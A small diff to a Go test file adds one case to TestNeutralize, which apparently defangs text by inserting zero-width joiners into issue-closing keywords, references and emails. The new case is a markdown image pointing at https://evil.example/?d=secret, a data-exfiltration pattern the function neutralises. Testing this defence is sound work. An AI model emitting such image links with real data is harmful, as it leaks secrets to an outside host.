@@ -285,6 +285,7 @@ func TestNeutralize(t *testing.T) {
 		"Fixes #12, closes #3":                              "F‍ixes #12, c‍loses #3",
 		"resolved octo/shelf#4":                             "r‍esolved octo/shelf#4",
 		"a@b.c is an email-ish":                             "a@‍b.c is an email-ish",
+		"see ![x](https://evil.example/?d=secret)":          "see !\u200d[x](https://evil.example/?d=secret)",
 		"prefix and suffix stay: fixture, closet, prefixes": "prefix and suffix stay: fixture, closet, prefixes",
 	}
 	for in, want := range cases {
